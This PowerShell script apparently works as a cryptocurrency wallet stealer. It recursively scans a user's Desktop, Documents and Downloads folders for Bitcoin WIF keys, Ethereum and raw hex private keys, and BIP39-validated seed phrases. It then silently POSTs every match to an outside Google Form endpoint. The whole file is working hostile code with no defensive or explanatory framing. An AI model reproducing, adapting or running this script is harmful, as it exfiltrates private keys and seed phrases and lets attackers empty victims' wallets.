# Define search locations (excluding AppData for now to avoid freezing)
$locations = @(
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\Documents",
    "$env:USERPROFILE\Downloads"
)

# Define file extensions to scan
$fileTypes = '*.txt', '*.json', '*.log', '*.conf'

# Regex patterns for potential secrets
$patterns = @(
    '\b[5KL][1-9A-HJ-NP-Za-km-z]{50,51}\b',         # Bitcoin WIF
    '\b0x[a-fA-F0-9]{64}\b',                        # Ethereum private key
    '\b[a-fA-F0-9]{64}\b',                          # Raw hex private key
    '\b(?:\w+\b[\s,]*){12,24}'                      # Seed phrases (to validate later)
)

# Max file size in bytes (5MB)
$maxFileSize = 5MB

# Google Form details
$formUrl = "https://docs.google.com/forms/u/0/d/e/1FAIpQLSdm5XuNDe2EVDC0NHMGJfiC35nh6_5kkXVY550Wc4HbHVT5cA/formResponse"
$fieldName = "entry.448178314"

# Load BIP39 word list from GitHub
try {
    $bip39Words = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/english.txt" -UseBasicParsing | Select-Object -ExpandProperty Content
    $bip39WordsList = $bip39Words -split "`n"
} catch {
    Write-Host "❌ Failed to load BIP39 word list. Exiting."
    exit
}

function IsValidSeedPhrase($phrase) {
    $words = $phrase -split '\s+'
    if ($words.Count -lt 12 -or $words.Count -gt 24) {
        return $false
    }
    foreach ($word in $words) {
        if ($bip39WordsList -notcontains $word.Trim()) {
            return $false
        }
    }
    return $true
}

$results = @()

# Start scanning
foreach ($location in $locations) {
    Write-Host "🔍 Scanning: $location"
    Get-ChildItem -Path $location -Recurse -Include $fileTypes -ErrorAction SilentlyContinue -Force | Where-Object {
        -not $_.PSIsContainer -and $_.Length -lt $maxFileSize
    } | ForEach-Object {
        $file = $_.FullName
        foreach ($pattern in $patterns) {
            try {
                $matches = Select-String -Path $file -Pattern $pattern -AllMatches -ErrorAction Stop
                foreach ($match in $matches) {
                    $value = $match.Matches.Value.Trim()

                    # Validate seed phrases
                    if ($pattern -like '*{12,24}' -and -not (IsValidSeedPhrase $value)) {
                        continue
                    }

                    $results += $value
                }
            } catch {
                # Skip unreadable files
            }
        }
    }
}

# Remove duplicates
$results = $results | Sort-Object -Unique

# Send each result to Google Form
foreach ($result in $results) {
    try {
        $body = @{ $fieldName = $result }
        Invoke-WebRequest -Uri $formUrl -Method POST -Body $body -ErrorAction SilentlyContinue | Out-Null
    } catch {
        Write-Host "❌ Failed to send: $result"
    }
}

Write-Host "`n✅ Scan complete. Total submitted: $($results.Count)"
